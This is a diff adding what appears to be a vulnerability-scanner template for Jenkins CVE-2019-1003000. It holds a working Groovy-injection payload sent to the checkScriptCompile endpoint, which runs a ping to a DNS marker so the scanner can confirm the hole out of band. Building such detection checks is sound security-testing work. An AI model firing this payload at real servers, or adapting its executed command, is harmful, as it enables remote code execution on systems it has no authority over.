@@ -1,0 +1,19 @@
+collect:
+ - uniq:
+   - [ HEADER_HOST ]
+generate:
+  - into: URI
+  - payload:
+    - "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@groovy.transform.ASTTest(value={%20Runtime.getRuntime().exec('ping%20DNS_MARKER')%20})%0Aclass%20Person%20{}"
+  - method:
+    - replace
+detect:
+  - oob:
+    - dns
+meta-info:
+  - type: rce
+  - threat: 90
+  - tags:
+    - Jenkins
+    - RCE
+    - CVE-2019-1003000
